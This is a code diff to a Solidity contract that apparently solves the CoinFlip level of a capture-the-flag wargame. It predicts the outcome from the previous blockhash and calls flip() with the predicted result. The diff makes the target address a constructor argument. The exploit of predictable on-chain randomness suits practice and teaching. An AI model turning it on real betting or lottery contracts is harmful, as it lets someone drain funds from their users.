@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.24;
+pragma solidity ^0.8.20;
 
 /**
  * @title 3. COINFLIP
@@ -12,9 +12,13 @@ interface ICoinFlip {
 
 // Deploy the Unflip contract and call the attack() function 10 times to win the level.
 contract Unflip {
-    address constant coinflip = 0xb721D5C58B4B2d7Fc82084541C639A6b6E3CBf73; // Replace with your CoinFlip instance
+    address immutable coinflip;
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinflip) {
+        coinflip = _coinflip;
+    }
 
     function playToWin() private view returns (bool) {
         uint256 pastBlockValue = uint256(blockhash(block.number - 1));
@@ -26,5 +30,3 @@ contract Unflip {
         ICoinFlip(coinflip).flip(playToWin());
     }
 }
-
-// 🎉 Level completed! 🎉
